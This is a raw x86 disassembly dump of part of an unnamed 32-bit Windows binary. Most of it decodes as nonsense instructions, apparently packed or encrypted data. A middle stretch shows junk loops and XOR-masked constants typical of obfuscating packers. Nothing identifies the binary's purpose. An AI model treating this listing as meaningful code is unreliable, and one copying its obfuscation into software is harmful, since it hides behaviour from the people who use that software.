  421c25:	push   ds
  421c26:	sbb    ebp,DWORD PTR [esi-0x3ffcb1d1]
  421c2c:	cmp    DWORD PTR [eax+0x37a8bba0],edx
  421c32:	sbb    al,0x26
  421c34:	icebp  
  421c35:	retf   
  421c36:	cli    
  421c37:	adc    eax,0xbbf1988c
  421c3c:	mov    edx,0xad2471ca
  421c41:	push   0x187bcf03
  421c46:	lods   al,BYTE PTR ss:[esi]
  421c48:	inc    edi
  421c49:	inc    ecx
  421c4a:	ret    
  421c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c4c:	push   edx
  421c4d:	arpl   WORD PTR [edi-0x3816e9a5],sp
  421c53:	fnstenv [esi-0x70]
  421c56:	cmp    eax,0x50fd21f
  421c5b:	ss in  al,0xc9
  421c5e:	pop    eax
  421c5f:	in     al,dx
  421c60:	xchg   edx,eax
  421c61:	and    esi,esp
  421c63:	pusha  
  421c64:	jae    0x421ce2
  421c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c67:	repnz push eax
  421c69:	std    
  421c6a:	test   al,0xc7
  421c6c:	out    dx,eax
  421c6d:	jmp    DWORD PTR [edi-0x30a3e43a]
  421c73:	mov    cl,0x79
  421c75:	jno    0x421cf3
  421c77:	cmp    cl,BYTE PTR [esi+0x206664ce]
  421c7d:	je     0x421cfb
  421c7f:	test   BYTE PTR [ebx-0x677bec3e],al
  421c85:	xor    BYTE PTR [edx+0x39],0x76
  421c89:	popa   
  421c8a:	sti    
  421c8b:	ror    ebp,cl
  421c8d:	call   0x6813:0x67f77171
  421c94:	imul   eax,DWORD PTR [edx+edi*8-0x1a279a7e],0x1b
  421c9c:	hlt    
  421c9d:	mov    ds:0xe10b5053,al
  421ca2:	fcom   DWORD PTR [edi-0x2e]
  421ca5:	xchg   ebx,eax
  421ca6:	in     eax,dx
  421ca7:	or     eax,DWORD PTR [ecx-0x43]
  421caa:	mov    ebx,0x2f38476b
  421caf:	daa    
  421cb0:	(bad)  [ebx-0x7b]
  421cb3:	lahf   
  421cb4:	mov    dl,0x96
  421cb6:	mov    edx,0x64540ee9
  421cbb:	sub    DWORD PTR [esi-0x36956809],0x85ce2c41
  421cc5:	sub    al,0x46
  421cc7:	ret    
  421cc8:	jnp    0x421c75
  421cca:	or     eax,DWORD PTR fs:[ecx]
  421ccd:	inc    DWORD PTR [ecx]
  421ccf:	int    0x59
  421cd1:	ins    DWORD PTR es:[edi],dx
  421cd2:	icebp  
  421cd3:	mov    edi,ebp
  421cd5:	rcl    BYTE PTR [esi+0x2e8c194c],cl
  421cdb:	mov    ecx,0xc100a7a9
  421ce0:	fiadd  DWORD PTR [eax+edx*2-0x1f8cc577]
  421ce7:	ja     0x421d08
  421ce9:	sub    eax,esi
  421ceb:	cli    
  421cec:	sar    esi,0xc5
  421cef:	ret    0x84c8
  421cf2:	les    ebx,FWORD PTR [eax-0x32]
  421cf5:	xchg   ecx,eax
  421cf6:	xor    DWORD PTR [ecx],edx
  421cf8:	sub    BYTE PTR [edx+0x46],ah
  421cfb:	sub    edi,DWORD PTR [eax+0x3c]
  421cfe:	adc    ecx,edi
  421d00:	fstp   TBYTE PTR ss:[ebp-0xf]
  421d04:	or     DWORD PTR [edi+0x23560b3a],ebp
  421d0a:	mov    ds:0x46e32b4a,al
  421d0f:	dec    edi
  421d10:	cmp    edi,edx
  421d12:	repz test eax,0xfd2bf601
  421d18:	pop    edx
  421d19:	mov    edi,0xe1e84751
  421d1e:	sbb    eax,0x29b92cce
  421d23:	loopne 0x421cb7
  421d25:	(bad)  
  421d27:	out    0x2d,eax
  421d29:	jmp    0x8950:0x8d5b7880
  421d30:	(bad)  
  421d31:	and    ebp,DWORD PTR [eax-0x72dfb05a]
  421d37:	xchg   edi,eax
  421d38:	mov    ecx,DWORD PTR [esi]
  421d3a:	add    BYTE PTR [esi],bh
  421d3c:	in     eax,dx
  421d3d:	and    BYTE PTR [ebp-0x27],ch
  421d40:	jnp    0x421d89
  421d42:	cmp    DWORD PTR [ebx],edx
  421d44:	inc    esp
  421d45:	je     0x421db0
  421d47:	cmp    BYTE PTR [edi],ch
  421d49:	xor    al,0xa7
  421d4b:	xchg   esp,eax
  421d4c:	scas   al,BYTE PTR es:[edi]
  421d4d:	pavgb  mm1,QWORD PTR [ecx+esi*2+0x49ea4cfb]
  421d55:	int    0x7b
  421d57:	jmp    0x562f:0xb03a4beb
  421d5e:	mov    esp,DWORD PTR [ecx+0x1f]
  421d61:	arpl   WORD PTR [edx+0x33],ax
  421d64:	inc    eax
  421d65:	arpl   WORD PTR [edi],cx
  421d67:	pop    edi
  421d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d69:	sub    al,0xab
  421d6b:	push   cs
  421d6c:	and    al,0x44
  421d6e:	outs   dx,BYTE PTR ds:[esi]
  421d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d70:	cmp    ecx,DWORD PTR [esi-0x2f]
  421d73:	pusha  
  421d74:	in     al,0x9f
  421d76:	inc    edx
  421d77:	push   0x6b
  421d79:	or     BYTE PTR [esi-0x18],bl
  421d7c:	sbb    DWORD PTR [edi],0x6750cd35
  421d82:	inc    edi
  421d83:	adc    ecx,edx
  421d85:	xchg   BYTE PTR [eax-0x1c2f6d86],bh
  421d8b:	outs   dx,DWORD PTR ds:[esi]
  421d8c:	(bad)  
  421d8d:	or     BYTE PTR [edx+0x15],cl
  421d90:	lea    edi,[edx-0x79a5d1dd]
  421d96:	inc    edx
  421d97:	loope  0x421d70
  421d99:	jmp    0xe48d:0xa6292d5d
  421da0:	pop    es
  421da1:	pop    ecx
  421da2:	push   eax
  421da3:	jne    0x421d93
  421da5:	loopne 0x421e13
  421da7:	into   
  421da8:	retf   0x832d
  421dab:	ins    BYTE PTR es:[edi],dx
  421dac:	das    
  421dad:	sub    eax,edi
  421daf:	mov    edx,0x145f038e
  421db4:	test   al,0xf5
  421db6:	shl    DWORD PTR [edi+0x3c],cl
  421db9:	(bad)  
  421dba:	mov    bl,0x72
  421dbc:	jecxz  0x421d7b
  421dbe:	bound  ebx,QWORD PTR [ecx-0x2c]
  421dc1:	pusha  
  421dc2:	cdq    
  421dc3:	mov    cl,0x79
  421dc5:	ror    BYTE PTR [edi+0x51],1
  421dc8:	fistp  QWORD PTR [ebp-0x2cd68336]
  421dce:	push   ss
  421dcf:	xor    edi,DWORD PTR [ebx]
  421dd1:	push   cs
  421dd2:	sbb    edx,DWORD PTR [ebp-0x53]
  421dd5:	jge    0x421ded
  421dd7:	cmp    eax,0xbd11f00
  421ddc:	add    DWORD PTR [edx-0x58],esi
  421ddf:	jmp    0x421e0d
  421de1:	sbb    ch,BYTE PTR gs:[ebx-0x7f4557ac]
  421de8:	pop    es
  421de9:	jp     0x421dfd
  421deb:	rol    DWORD PTR [ebp-0x76f471f7],cl
  421df1:	out    dx,al
  421df2:	and    eax,0xe818dbc9
  421df7:	sub    eax,0x571bc936
  421dfc:	stc    
  421dfd:	sahf   
  421dfe:	xchg   esp,eax
  421dff:	mov    edi,0x7cbcbd06
  421e04:	fsubr  QWORD PTR [ecx]
  421e06:	loopne 0x421e44
  421e08:	js     0x421dc7
  421e0a:	not    dl
  421e0c:	push   ss
  421e0d:	xchg   DWORD PTR [ebp+0x5ccf8f25],edi
  421e13:	(bad)  
  421e14:	shr    bl,cl
  421e16:	jg     0x421e95
  421e18:	movzx  ebx,WORD PTR [ebx-0x19]
  421e1c:	out    0x32,eax
  421e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e1f:	cmp    al,0x5
  421e21:	and    BYTE PTR [esi],0xf4
  421e24:	add    DWORD PTR [edx-0x13],esi
  421e27:	iret   
  421e28:	enter  0xeee3,0x93
  421e2c:	xchg   ebx,eax
  421e2d:	sub    al,0xfc
  421e2f:	mov    edi,0xc5219bdb
  421e34:	lahf   
  421e35:	js     0x421eb6
  421e37:	xor    DWORD PTR [esi+0x40f50337],esi
  421e3d:	or     eax,0x9ad9b52e
  421e42:	push   ecx
  421e43:	inc    ebp
  421e44:	inc    edi
  421e45:	mov    fs,WORD PTR [edx]
  421e47:	fwait
  421e48:	push   ebx
  421e49:	lahf   
  421e4a:	push   eax
  421e4b:	inc    eax
  421e4c:	call   0x2a38de49
  421e51:	mov    cl,ah
  421e53:	rol    BYTE PTR [ebp+0x35],cl
  421e56:	cmc    
  421e57:	popf   
  421e58:	(bad)  
  421e59:	int    0xcb
  421e5b:	cli    
  421e5c:	mov    ebx,0x2d9bbf1e
  421e61:	jbe    0x421e9d
  421e63:	lods   eax,DWORD PTR ds:[esi]
  421e64:	mov    ch,0x79
  421e66:	xchg   ecx,eax
  421e67:	dec    ebx
  421e68:	jl     0x421ee4
  421e6a:	(bad)  
  421e6b:	jno    0x421e1c
  421e6d:	stos   BYTE PTR es:[edi],al
  421e6e:	out    dx,eax
  421e6f:	mov    al,ds:0x38c52612
  421e74:	jae    0x421e4f
  421e76:	inc    esp
  421e77:	ret    0x3ee8
  421e7a:	mov    DWORD PTR [esp+eax*2+0xbcec2b7],0xf45072a9
  421e85:	mov    al,ds:0x1caa858b
  421e8a:	mov    cl,0x20
  421e8c:	cli    
  421e8d:	xchg   edi,eax
  421e8e:	sbb    al,0xd3
  421e90:	xor    DWORD PTR [esi+0x70a29a56],eax
  421e96:	out    0x74,eax
  421e98:	dec    ebx
  421e99:	xchg   BYTE PTR fs:[edx-0x2091fde],al
  421ea0:	jle    0x421ef8
  421ea2:	pop    ebx
  421ea3:	jmp    0x1dd4:0x205f8466
  421eaa:	lods   eax,DWORD PTR ds:[esi]
  421eab:	inc    ebp
  421eac:	aad    0x10
  421eae:	call   0x97c0:0x34b831b9
  421eb5:	mov    DWORD PTR [ebx+0x75a4e20e],ecx
  421ebb:	ins    BYTE PTR es:[edi],dx
  421ebc:	xchg   esp,eax
  421ebd:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  421ebf:	xchg   edx,eax
  421ec0:	xchg   edi,eax
  421ec1:	xor    edi,DWORD PTR [edi]
  421ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ec4:	sar    esp,cl
  421ec6:	and    bh,BYTE PTR [ebx-0xb]
  421ec9:	popa   
  421eca:	ja     0x421eca
  421ecc:	mov    ch,BYTE PTR [ebx+0x3b7dce70]
  421ed2:	inc    ecx
  421ed3:	jl     0x421e7a
  421ed5:	xor    al,BYTE PTR [edx+0x1f]
  421ed8:	cmp    al,0x89
  421eda:	mov    bh,0x73
  421edc:	fimul  DWORD PTR [edi]
  421ede:	push   cs
  421edf:	pop    ss
  421ee0:	test   DWORD PTR [ebx],ebp
  421ee2:	test   al,0x8c
  421ee4:	idiv   DWORD PTR [edi-0x3a8d6bd2]
  421eea:	in     al,0x2e
  421eec:	jl     0x421e94
  421eee:	mov    esi,DWORD PTR [ebp-0x2cc361fe]
  421ef4:	lahf   
  421ef5:	fdivr  QWORD PTR [ecx+0x18bbd5f3]
  421efb:	stos   BYTE PTR es:[edi],al
  421efc:	dec    edi
  421efd:	int3   
  421efe:	fldcw  WORD PTR [ebx]
  421f00:	mov    DWORD PTR [edi-0x8eafd],eax
  421f06:	(bad)  
  421f07:	loopne 0x421f06
  421f09:	push   esi
  421f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f0b:	add    eax,0x4eefac90
  421f10:	(bad)  
  421f11:	fld1   
  421f13:	and    eax,0x77017419
  421f18:	shr    DWORD PTR [ecx+0x64],1
  421f1b:	imul   ebx,DWORD PTR [eax-0x1968782c],0x4d2e1ef0
  421f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f26:	jmp    0x421f3c
  421f28:	or     al,0x8d
  421f2a:	xchg   DWORD PTR [edx],ecx
  421f2c:	adc    ebx,DWORD PTR [ecx+esi*2+0x7565ef59]
  421f33:	jmp    0x27c4b3a
  421f38:	cmp    al,0x98
  421f3a:	sbb    BYTE PTR [ebx+0x7f52cb42],dh
  421f40:	scas   al,BYTE PTR es:[edi]
  421f41:	and    ebx,DWORD PTR [edx+0x442b5627]
  421f47:	dec    DWORD PTR [eax-0x79193f57]
  421f4d:	pop    eax
  421f4e:	mov    ebp,0x7baca11b
  421f53:	inc    eax
  421f54:	xchg   ebp,eax
  421f55:	(bad)  
  421f56:	jle    0x421fb0
  421f58:	test   BYTE PTR [esp+edx*2+0x65],al
  421f5c:	hlt    
  421f5d:	xchg   esp,eax
  421f5e:	cmp    esp,esp
  421f60:	hlt    
  421f61:	xchg   ecx,eax
  421f62:	xor    DWORD PTR [esi],esi
  421f64:	pop    edx
  421f65:	xor    ebx,esi
  421f67:	ins    DWORD PTR es:[edi],dx
  421f68:	pop    esi
  421f69:	and    al,0xb6
  421f6b:	inc    edi
  421f6c:	inc    esi
  421f6d:	ins    DWORD PTR es:[edi],dx
  421f6e:	rol    BYTE PTR [edx-0x69],cl
  421f71:	sub    eax,0x4d8b7a6d
  421f76:	or     BYTE PTR [ebx-0x37cc07ab],cl
  421f7c:	xor    edx,eax
  421f7e:	sub    ecx,edx
  421f80:	sub    ecx,esi
  421f82:	xor    ecx,eax
  421f84:	mov    DWORD PTR [ebp+0x8],ecx
  421f87:	mov    ecx,DWORD PTR [ebp+0x8]
  421f8a:	mov    edx,DWORD PTR [ebp-0x58]
  421f8d:	add    ecx,0x5708fa
  421f93:	imul   ecx,edx
  421f96:	mov    DWORD PTR [ebp-0x58],ecx
  421f99:	mov    ecx,DWORD PTR [ebp+0x8]
  421f9c:	mov    edx,DWORD PTR [ebp-0x54]
  421f9f:	add    ecx,0x64f898
  421fa5:	or     ecx,edx
  421fa7:	mov    DWORD PTR [ebp-0x54],ecx
  421faa:	mov    ecx,DWORD PTR [ebp+0x8]
  421fad:	mov    edx,DWORD PTR [ebp-0x50]
  421fb0:	add    ecx,0x242ebc9
  421fb6:	xor    ecx,edx
  421fb8:	mov    DWORD PTR [ebp-0x50],ecx
  421fbb:	mov    ecx,DWORD PTR [ebp+0x8]
  421fbe:	mov    edx,DWORD PTR [ebp-0x4c]
  421fc1:	add    ecx,edi
  421fc3:	and    ecx,edx
  421fc5:	mov    DWORD PTR [ebp-0x4c],ecx
  421fc8:	mov    ecx,DWORD PTR [ebp+0x8]
  421fcb:	mov    edx,DWORD PTR [ebp-0x48]
  421fce:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421fd5:	mov    DWORD PTR [ebp-0x48],ecx
  421fd8:	mov    ecx,DWORD PTR [ebp+0x8]
  421fdb:	mov    edx,0xfa5e1524
  421fe0:	sub    edx,ecx
  421fe2:	add    edx,DWORD PTR [ebp-0x44]
  421fe5:	mov    DWORD PTR [ebp-0x44],edx
  421fe8:	mov    ecx,DWORD PTR [ebp+0x8]
  421feb:	xor    ecx,eax
  421fed:	add    ecx,esi
  421fef:	jne    0x421f74
  421ff5:	mov    ecx,DWORD PTR [ebp-0x8]
  421ff8:	xor    ecx,eax
  421ffa:	mov    eax,DWORD PTR [ebp+0x10]
  421ffd:	add    ecx,esi
  421fff:	mov    DWORD PTR [eax],ecx
  422001:	pop    edi
  422002:	pop    esi
  422003:	pop    ebx
  422004:	leave  
  422005:	ret    0xc
  422008:	push   ebp
  422009:	mov    ebp,esp
  42200b:	sub    esp,0x78
  42200e:	and    DWORD PTR ds:0x42a26e,0x0
  422018:	jmp    0x42202a
  42201d:	mov    ecx,DWORD PTR ds:0x42a26e
  422023:	inc    ecx
  422024:	mov    DWORD PTR ds:0x42a26e,ecx
  42202a:	cmp    DWORD PTR ds:0x42a26e,0x18
  422031:	jae    0x422079
  422037:	cmp    DWORD PTR ds:0x42a26e,0x4
  42203e:	ja     0x422079
  422044:	jmp    0x42205a
  422049:	push   DWORD PTR [ebp-0x14]
  42204c:	push   0x3437
  422051:	push   DWORD PTR [ebp-0x10]
  422054:	call   DWORD PTR ds:0x42a3da
  42205a:	cmp    DWORD PTR ds:0x42a26e,0x3
  422061:	jne    0x422074
  422067:	mov    ecx,DWORD PTR ds:0x42a26e
  42206d:	inc    ecx
  42206e:	mov    DWORD PTR ds:0x42a26e,ecx
  422074:	jmp    0x42201d
  422079:	push   esi
  42207a:	push   edi
  42207b:	and    DWORD PTR ds:0x42a2d2,0x0
  422085:	jmp    0x422097
  42208a:	mov    edi,DWORD PTR ds:0x42a2d2
  422090:	inc    edi
  422091:	mov    DWORD PTR ds:0x42a2d2,edi
  422097:	cmp    DWORD PTR ds:0x42a2d2,0x1c
  42209e:	jae    0x4220f2
  4220a4:	cmp    DWORD PTR ds:0x42a2d2,0xb
  4220ab:	jle    0x4220f2
  4220b1:	jmp    0x4220d3
  4220b6:	push   0x87a7
  4220bb:	push   0x2194
  4220c0:	push   0x6620
  4220c5:	push   DWORD PTR [ebp-0x24]
  4220c8:	push   0x42a25e
  4220cd:	call   DWORD PTR ds:0x42a3de
  4220d3:	cmp    DWORD PTR ds:0x42a2d2,0xa
  4220da:	jne    0x4220ed
  4220e0:	mov    edi,DWORD PTR ds:0x42a2d2
  4220e6:	inc    edi
  4220e7:	mov    DWORD PTR ds:0x42a2d2,edi
  4220ed:	jmp    0x42208a
  4220f2:	mov    eax,ds:0x42941e
  4220f7:	adc    ecx,esi
  4220f9:	mov    DWORD PTR [ebp-0x24],eax
  4220fc:	mov    DWORD PTR ds:0x42a27a,0x1f
  422106:	cmp    DWORD PTR ds:0x42a27a,0x0
  42210d:	je     0x422145
  422113:	cmp    DWORD PTR ds:0x42a27a,0x24
  42211a:	ja     0x422145
  422120:	jmp    0x422133
  422125:	push   DWORD PTR [ebp-0x20]
  422128:	push   0x807a
  42212d:	call   DWORD PTR ds:0x42a3e2
  422133:	mov    ecx,DWORD PTR ds:0x42a27a
  422139:	dec    ecx
  42213a:	mov    DWORD PTR ds:0x42a27a,ecx
  422140:	jmp    0x422106
  422145:	mov    eax,ds:0x42953e
  42214a:	and    DWORD PTR ds:0x42a2e2,0x0
  422154:	jmp    0x422168
  422159:	xor    edi,edi
  42215b:	xor    edi,DWORD PTR ds:0x42a2e2
  422161:	inc    edi
  422162:	mov    DWORD PTR ds:0x42a2e2,edi
  422168:	cmp    DWORD PTR ds:0x42a2e2,0x19
  42216f:	jae    0x422197
  422175:	cmp    DWORD PTR ds:0x42a2e2,0x1e
  42217c:	jge    0x422197
  422182:	jmp    0x422192
  422187:	push   0x2c0a
  42218c:	call   DWORD PTR ds:0x42a3ea
  422192:	jmp    0x422159
  422197:	mov    DWORD PTR [ebp-0x30],eax
  42219a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4221a1:	sbb    DWORD PTR ds:0x42a25a,edx
  4221a7:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  4221ae:	mov    DWORD PTR ds:0x42a27a,0x1d
  4221b8:	cmp    DWORD PTR ds:0x42a27a,0x0
  4221bf:	je     0x422218
  4221c5:	cmp    DWORD PTR ds:0x42a27a,0xf
  4221cc:	jge    0x422218
  4221d2:	jmp    0x4221ec
  4221d7:	push   0x8cd0
  4221dc:	push   0x429247
  4221e1:	push   0x429247
  4221e6:	call   DWORD PTR ds:0x42a3b6
  4221ec:	cmp    DWORD PTR ds:0x42a27a,0x10
  4221f3:	jne    0x422206
  4221f9:	mov    ecx,DWORD PTR ds:0x42a27a
  4221ff:	dec    ecx
  422200:	mov    DWORD PTR ds:0x42a27a,ecx
  422206:	mov    ecx,DWORD PTR ds:0x42a27a
  42220c:	dec    ecx
  42220d:	mov    DWORD PTR ds:0x42a27a,ecx
  422213:	jmp    0x4221b8
  422218:	mov    eax,DWORD PTR [ebp-0x10]
  42221b:	and    DWORD PTR ds:0x42a256,0x0
  422225:	jmp    0x422237
  42222a:	mov    esi,DWORD PTR ds:0x42a256
  422230:	inc    esi
  422231:	mov    DWORD PTR ds:0x42a256,esi
  422237:	cmp    DWORD PTR ds:0x42a256,0x14
  42223e:	jae    0x42226b
  422244:	cmp    DWORD PTR ds:0x42a256,0x1b
  42224b:	jl     0x42226b
  422251:	jmp    0x422266
  422256:	push   0x42913d
  42225b:	push   0x400000
  422260:	call   DWORD PTR ds:0x42a3ba
  422266:	jmp    0x42222a
  42226b:	mov    ecx,DWORD PTR [ebp-0x10]
  42226e:	mov    DWORD PTR ds:0x42a25e,0x2ef8
  422278:	sub    eax,ecx
  42227a:	and    DWORD PTR ds:0x42a2c2,0x0
  422284:	mov    edi,DWORD PTR ds:0x42a2c2
  42228a:	inc    edi
  42228b:	mov    DWORD PTR ds:0x42a2c2,edi
  422291:	cmp    DWORD PTR ds:0x42a2c2,0x7
  422298:	jbe    0x4222e0
  42229e:	jmp    0x4222b9
  4222a3:	push   DWORD PTR [ebp-0x1c]
  4222a6:	push   DWORD PTR [ebp-0x24]
  4222a9:	push   0x5955
  4222ae:	push   0x5167
  4222b3:	call   DWORD PTR ds:0x42a3be
  4222b9:	cmp    DWORD PTR ds:0x42a2c2,0x6
  4222c0:	jne    0x4222d3
  4222c6:	mov    edi,DWORD PTR ds:0x42a2c2
  4222cc:	inc    edi
  4222cd:	mov    DWORD PTR ds:0x42a2c2,edi
  4222d3:	cmp    DWORD PTR ds:0x42a2c2,0x13
  4222da:	jb     0x422284
  4222e0:	mov    DWORD PTR [ebp-0x10],eax
  4222e3:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4222ea:	mov    eax,DWORD PTR [ebp-0x18]
  4222ed:	mov    ecx,DWORD PTR [ebp-0x18]
  4222f0:	sub    eax,ecx
  4222f2:	mov    DWORD PTR [ebp-0x18],eax
  4222f5:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4222fc:	mov    eax,DWORD PTR [ebp-0xc]
  4222ff:	mov    ecx,DWORD PTR [ebp-0xc]
  422302:	sub    eax,ecx
  422304:	mov    DWORD PTR [ebp-0xc],eax
  422307:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42230e:	mov    eax,DWORD PTR [ebp-0x1c]
  422311:	mov    ecx,DWORD PTR [ebp-0x1c]
  422314:	sub    eax,ecx
  422316:	mov    DWORD PTR [ebp-0x1c],eax
  422319:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  422320:	mov    eax,DWORD PTR [ebp-0x20]
  422323:	mov    ecx,DWORD PTR [ebp-0x20]
  422326:	sub    eax,ecx
  422328:	mov    DWORD PTR [ebp-0x20],eax
  42232b:	mov    eax,DWORD PTR [ebp-0x2c]
  42232e:	mov    ecx,DWORD PTR [ebp-0x20]
  422331:	mov    esi,0x75108aa
  422336:	xor    eax,esi
  422338:	mov    edi,0x3272f1
  42233d:	add    eax,edi
  42233f:	or     eax,ecx
  422341:	jmp    0x423338
  422346:	mov    dl,0x1f
  422348:	xlat   BYTE PTR ds:[ebx]
  422349:	and    edx,edx
  42234b:	mov    eax,ds:0xbec98882
  422350:	js     0x422396
  422352:	mov    esp,0x2bb4cd07
  422357:	xchg   edx,eax
  422358:	jl     0x4222dd
  42235a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42235b:	jb     0x4222e0
  42235d:	or     ebx,0xffffffc6
  422360:	and    ebp,edx
  422362:	mov    dh,0x12
  422364:	xchg   BYTE PTR [eax-0x17],cl
  422367:	les    ebx,FWORD PTR [edi+0x46daf2e1]
  42236d:	push   ebp
  42236e:	mov    bh,0xb5
  422370:	pop    ds
  422371:	rcr    BYTE PTR [edx+ecx*4],cl
  422374:	sub    DWORD PTR [eax+ebp*2],esi
  422377:	int    0x1e
  422379:	call   0x7b4c:0xdecef886
  422380:	pop    edx
  422381:	push   ecx
  422382:	(bad)  
  422383:	fisttp QWORD PTR [esi+0x4771165b]
  422389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42238a:	inc    ecx
  42238b:	xor    eax,0xce112eb0
  422390:	fdivr  QWORD PTR [eax+ebp*8+0x2b45ae40]
  422397:	pop    eax
  422398:	add    DWORD PTR [eax],ecx
  42239a:	stos   DWORD PTR es:[edi],eax
  42239b:	inc    edi
  42239c:	jl     0x42236c
  42239e:	mov    cl,0xb8
  4223a0:	adc    al,0xf6
  4223a2:	pop    eax
  4223a3:	xor    eax,0xca130918
  4223a8:	inc    ebp
  4223a9:	or     DWORD PTR [esi-0xf904505],edx
  4223af:	mov    al,0xb9
  4223b1:	mov    ebx,0xef24e1c0
  4223b6:	sub    dh,dl
  4223b8:	(bad)  
  4223b9:	(bad)  
  4223ba:	repz cmp esp,0xfffffff1
  4223be:	std    
  4223bf:	mov    BYTE PTR [ebp+0x11c5d033],dh
  4223c5:	mov    bh,0x93
  4223c7:	or     al,0xbb
  4223c9:	mov    ah,0xb2
  4223cb:	add    dl,BYTE PTR [esi]
  4223cd:	or     DWORD PTR [ecx],ebp
  4223cf:	sbb    al,0x4
  4223d1:	xchg   ebp,eax
  4223d2:	fld    TBYTE PTR fs:[edx+0x224137a0]
  4223d9:	sub    eax,0xb7da8a78
  4223de:	lods   eax,DWORD PTR ds:[esi]
  4223df:	das    
  4223e0:	std    
  4223e1:	popf   
  4223e2:	jb     0x422416
  4223e4:	jle    0x4223ca
  4223e6:	push   esp
  4223e7:	sub    ah,BYTE PTR [edi-0x50eb346f]
  4223ed:	pop    ax
  4223ef:	mov    BYTE PTR [esi+0x27],0xb5
  4223f3:	mov    ah,0x7a
  4223f5:	fs cmc 
  4223f7:	mov    BYTE PTR [ebx+0x57],al
  4223fa:	xor    ch,0x8f
  4223fd:	aad    0x34
  4223ff:	push   ebx
  422400:	inc    edx
  422401:	cli    
  422402:	mov    al,0x86
  422404:	lds    edx,FWORD PTR [eax]
  422406:	mov    cl,0x0
  422408:	cmp    eax,0x38189fd2
  42240d:	sub    DWORD PTR [ebp+edx*4-0x48bd770d],eax
  422414:	icebp  
  422415:	jns    0x4223f7
  422417:	jbe    0x4223c3
  422419:	inc    eax
  42241a:	fucomi st,st(0)
  42241c:	out    dx,eax
  42241d:	es (bad) 
  42241f:	adc    bh,BYTE PTR [ebp-0x54]
  422422:	xchg   ebx,eax
  422423:	pop    eax
  422424:	enter  0xecb9,0x31
  422428:	ins    DWORD PTR es:[edi],dx
  422429:	int3   
  42242a:	imul   esp,DWORD PTR [eax+ebx*8],0x33
  42242e:	repz les ebp,FWORD PTR [esi+0xf]
  422432:	pop    ecx
  422433:	sbb    ebp,esi
  422435:	pop    edx
  422436:	cmc    
  422437:	adc    eax,edx
  422439:	cmp    al,0x82
  42243b:	repnz neg BYTE PTR [esi-0xb80a2fa]
  422442:	dec    edx
  422443:	xchg   ebx,eax
  422444:	mov    WORD PTR [eax-0x43f606d0],fs
  42244a:	add    dh,ah
  42244c:	test   al,0xb3
  42244e:	mov    ebx,0x2b464166
  422453:	pop    ecx
  422454:	push   cs
  422455:	rcr    DWORD PTR [ecx-0x35bec69b],cl
  42245b:	std    
  42245c:	push   edi
  42245d:	out    dx,al
  42245e:	xor    BYTE PTR [eax+0x6],ah
  422461:	jmp    0x422455
  422463:	call   0xaef7836c
  422468:	(bad)  
  422469:	and    BYTE PTR [eax-0x16783907],ch
  42246f:	sbb    DWORD PTR [ecx+0x11],0xd98fb71d
  422476:	and    dl,ch
  422478:	cdq    
  422479:	add    BYTE PTR [edx],cl
  42247b:	ret    
  42247c:	popa   
  42247d:	add    BYTE PTR [edx-0x10f5e0ba],0x5
  422484:	mov    WORD PTR [ecx],cs
  422486:	and    BYTE PTR [edi-0x5120fa1b],dl
  42248c:	xor    DWORD PTR [esi-0x67],ebx
  42248f:	add    bl,BYTE PTR [esi-0x4d4d9d1f]
  422495:	cmp    DWORD PTR [esi],ebx
  422497:	and    ch,BYTE PTR [ecx+0x7d]
  42249a:	push   ebx
  42249b:	jmp    0x422452
  42249d:	mov    ah,0x31
  42249f:	jmp    0x7235:0x36f18685
  4224a6:	adc    al,0x1
  4224a8:	out    dx,eax
  4224a9:	xor    cl,BYTE PTR [edx+0x7460cf33]
  4224af:	data16 jg 0x422444
  4224b2:	test   al,0x86
  4224b4:	outs   dx,BYTE PTR ds:[esi]
  4224b5:	fst    QWORD PTR [ecx+edx*1+0x304112e6]
  4224bc:	(bad)
  4224bf:	pop    edx
  4224c0:	adc    eax,0xdb1d7096
  4224c5:	lods   al,BYTE PTR ds:[esi]
  4224c6:	imul   ebp,DWORD PTR ds:0x1a556caa,0x59
  4224cd:	cmp    esp,ecx
  4224cf:	push   eax
  4224d0:	jmp    0x42251a
  4224d2:	fwait
  4224d3:	sbb    dh,BYTE PTR [eax+0x33]
  4224d6:	and    DWORD PTR [eax+0x42dd72eb],0x379dd7fd
  4224e0:	adc    DWORD PTR [edx],ecx
  4224e2:	cld    
  4224e3:	leave  
  4224e4:	mov    ebx,es
  4224e6:	(bad)  
  4224e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224e8:	xor    eax,0xc4a105dc
  4224ed:	dec    esp
  4224ee:	sub    cl,dh
  4224f0:	ret    
  4224f1:	sbb    eax,0xc0bcc392
  4224f6:	hlt    
  4224f7:	test   BYTE PTR [esi+0x69e7cca5],al
  4224fd:	shl    BYTE PTR [esi-0x71],0x3d
  422501:	mov    ecx,0xb3d3e3f6
  422506:	push   edi
  422507:	push   esi
  422508:	push   ebp
  422509:	sub    esi,DWORD PTR [edi-0x4647c515]
  42250f:	icebp  
  422510:	xchg   ebx,eax
  422511:	rcr    DWORD PTR [ebp+0x43],0xcb
  422515:	test   BYTE PTR [ecx],dl
  422517:	pop    ss
  422518:	pop    edx
  422519:	shr    al,cl
  42251b:	dec    eax
  42251c:	cdq    
  42251d:	cld    
  42251e:	jecxz  0x422539
  422520:	or     ebx,0xfffffff5
  422523:	pop    ebx
  422524:	inc    edi
  422525:	adc    bl,BYTE PTR [edx+0x46]
  422528:	(bad)  
  422529:	or     ecx,DWORD PTR [eax-0x41]
